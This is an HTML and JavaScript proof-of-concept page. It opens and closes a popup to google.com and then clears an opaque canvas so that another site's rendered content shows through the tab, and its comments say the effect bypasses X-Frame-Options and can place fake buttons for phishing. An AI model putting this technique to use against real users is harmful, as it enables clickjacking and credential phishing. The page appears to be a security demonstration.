<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <style>
        body,
        canvas {
            position: absolute;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            margin: 0;

        }
        span{
            position:absolute;
            left:1%;
            top:1%;
        }
        canvas {
            z-index: 1;
            display:none;
        }
    </style>
    <canvas></canvas>
    <span>Allow popups and refresh to automatically grab Google<br><br>Instructions:<br>1. Leave this site open in a tab<br>2. Go to another tab with any website on it<br>3. Come back to this tab<br>If it doesn't work, start again<br>This doesn't work on iPhones or Firefox</span>
    <script>
        var canvas = document.querySelector('canvas')
        ctx = canvas.getContext('2d', { alpha: false })
        canvas.width = document.body.clientWidth
        canvas.height = document.body.clientHeight
        var drawing = false
        ctx.font = '15px Arial'
        document.addEventListener('visibilitychange', e => {
            if (document.visibilityState !== 'visible') {
                if (!drawing) {
                    setInterval(function () {
                        //must clearrect a canvas with alpha set to false in the getContext at a high rate (this is 60fps)
                        //the website isn't drawn to the canvas, but the current tab is made transparent so that the previous page is shown.
                        //by quickly opening and closing a tab, I can choose the previous page shown. 
                        ctx.clearRect(0, 0, canvas.width, canvas.height)
                        var str = "This isn't able to read the webpage but can be used for phishing attacks by placing buttons on top of areas where buttons are known to be. IFrames can do something similar, but this bypasses the X-Frames-Options header."
                        ctx.fillRect(0,0,ctx.measureText(str).width+6,21)
                        ctx.fillStyle = '#000'
                        ctx.fillText(str,3,18)
                        ctx.fillStyle = '#fff'
                    }, 1000 / 60)
                    canvas.style.display = 'inline-block'
                    
                    drawing = true
                }
            }
        })
        //temporarily open tab
        var w = window.open('http://google.com')
        setTimeout(function(){
            if(w!=null){
                w.close()
            }
            //doesn't work for certain websites, but the window.open still opens and the content is still mirrored
        },100)
    </script>
</body>

</html>